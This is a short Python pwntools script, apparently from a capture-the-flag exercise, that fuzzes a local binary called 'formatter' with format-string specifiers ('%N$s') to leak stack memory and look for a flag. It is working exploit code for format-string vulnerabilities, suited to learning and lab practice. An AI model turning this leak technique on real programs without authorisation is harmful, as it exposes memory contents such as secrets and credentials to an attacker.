from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./formatter', checksec=False)

# Let's fuzz 100 values
for i in range(400):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        p.recvline()
        # When we see the user prompt '>', format the counter
        # e.g. %2$s will attempt to print second pointer as string
        p.sendline('%{}$s'.format(i).encode())
        # Receive the response
        result = p.recvline()
        # Check for flag
        # if("flag" in str(result).lower()):
        print(str(i) + ': ' + str(result))
        # Exit the process
        p.close()
    except EOFError:
        pass